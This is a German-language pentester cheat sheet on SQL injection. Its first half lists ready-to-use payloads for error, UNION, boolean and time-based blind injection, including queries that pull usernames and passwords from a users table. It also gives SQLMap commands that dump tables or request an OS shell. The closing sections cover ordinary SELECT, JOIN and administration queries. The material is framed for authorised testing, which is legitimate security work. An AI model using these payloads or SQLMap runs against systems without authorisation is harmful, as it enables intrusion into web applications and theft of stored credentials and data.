---
title: "SQL Injection & Datenbankabfragen: Referenz für Pentester"
description: "SQL-Injection-Payloads, UNION-Angriffe, Blind-SQLi-Techniken und Standardabfragen für MySQL und PostgreSQL. Eine taktische Referenz für Penetrationstester und Datenbankadministratoren."
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["SQL-Injection-Payloads", "MySQL-Befehle Cheatsheet", "PostgreSQL Cheat Sheet", "Datenbank-Hacking", "SQLMap-Befehle", "Union SQL Injection", "Blind SQL Injection", "SQL-Injection-Tests", "Datenbank-Enumeration", "SQL-Injection-Prävention"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "SQL Injection & Datenbankabfragen: Referenz für Pentester",
    "description": "SQL-Injection-Payloads, UNION-Angriffe, Blind SQLi und Datenbankabfragen für MySQL und PostgreSQL.",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "de"
  }
---

## Systeminitialisierung

SQL Injection bleibt eine der kritischsten Schwachstellen in Webanwendungen — durchgehend in den OWASP Top 10 gelistet. Sie tritt auf, wenn Benutzereingaben direkt in SQL-Abfragen eingefügt werden, ohne ordnungsgemäß bereinigt zu werden, wodurch ein Angreifer die Logik der Datenbankabfrage manipulieren kann. Eine erfolgreiche SQL Injection kann zur vollständigen Datenexfiltration, Umgehung der Authentifizierung, Rechteeskalation und in einigen Fällen zur Remote-Befehlsausführung auf dem Datenbankserver führen. Dieses Feldhandbuch bietet sowohl die offensiven Payloads für autorisierte Penetrationstests als auch die Standard-SQL-Abfragen, die jeder Datenbankadministrator kennen muss.

Alle Injection-Techniken sind ausschließlich für autorisierte Tests bestimmt. Unbefugter Zugriff ist illegal.

---

## SQLi-Erkennung

Bevor Sie eine SQL-Injection-Schwachstelle ausnutzen, müssen Sie ihre Existenz bestätigen. Die Erkennung umfasst das Senden speziell gestalteter Eingaben an Anwendungsparameter und die Beobachtung der Antwort auf Fehlermeldungen, Verhaltensänderungen oder Zeitunterschiede. Diese ersten Sonden zeigen Ihnen, ob der Parameter injizierbar ist und welche Art der Injection möglich ist.

### Grundlegende Erkennungs-Payloads

```sql
-- Single quote test (triggers syntax error if vulnerable)
'

-- Double quote test
"

-- Comment-based detection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Numeric injection test (always true vs always false)
1 OR 1=1
1 AND 1=2

-- String-based detection
' OR 'a'='a
' OR 'a'='a'--

-- Error-based detection (force a type conversion error)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based detection (if the response is delayed, injection exists)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Identifizierung des Datenbank-Backends

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## UNION-Angriffe

Die UNION-basierte SQL Injection ist die leistungsstärkste Technik, wenn Fehlermeldungen oder Abfrageergebnisse auf der Seite angezeigt werden. Sie funktioniert durch Anhängen einer `UNION SELECT`-Anweisung an die ursprüngliche Abfrage, wodurch Sie Daten aus jeder Tabelle der Datenbank extrahieren können. Die Hauptanforderung besteht darin, die korrekte Anzahl der Spalten in der ursprünglichen Abfrage zu ermitteln, damit die UNION-Anweisung übereinstimmt.

### Spaltenanzahl ermitteln

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (error at N means there are N-1 columns)

-- Using UNION SELECT with NULL placeholders
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (no error means correct column count)
```

### Daten extrahieren

```sql
-- Find which columns are displayed on the page
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract current database name
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Extract current user
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- List all databases (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in a database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract usernames and passwords
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## Blind SQL Injection

Wenn die Anwendung weder Abfrageergebnisse noch Fehlermeldungen auf der Seite anzeigt, haben Sie es mit Blind SQL Injection zu tun. Die Schwachstelle existiert weiterhin, aber die Datenextraktion erfordert Rückschlüsse — entweder durch boolesche Bedingungen (ändert sich die Seite?) oder Zeitverzögerungen (dauert die Antwort länger?). Blind SQLi ist langsamer, aber ebenso gefährlich.

### Boolesche Blind-Injection

```sql
-- Test if the first character of the database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test using ASCII values
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Binary search approach (faster than linear)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is it > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- Is it > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- Is it > 'p'?
```

### Zeitbasierte Blind-Injection

```sql
-- MySQL: if condition is true, response is delayed by 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data using time delays
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## Automatisierung mit SQLMap

SQLMap ist das Standardwerkzeug der Branche für die automatisierte Erkennung und Ausnutzung von SQL Injections. Es übernimmt Erkennung, Fingerprinting, Datenextraktion und sogar Zugriff auf Betriebssystemebene durch SQL Injection — alles über die Kommandozeile. Für autorisierte Penetrationstests beschleunigt es die Exploitation-Phase erheblich.

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## Standard-SQL-Abfragen

Über Injection-Tests hinaus muss jeder Sicherheitsexperte und Entwickler Standard-SQL für die Datenbankadministration, Log-Analyse und Datenextraktion bei Untersuchungen kennen. Diese Abfragen funktionieren sowohl mit MySQL als auch mit PostgreSQL und decken die gängigsten Datenbankoperationen ab.

### SELECT-Abfragen

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### JOIN-Abfragen

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT, UPDATE, DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### Datenbankadministration

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
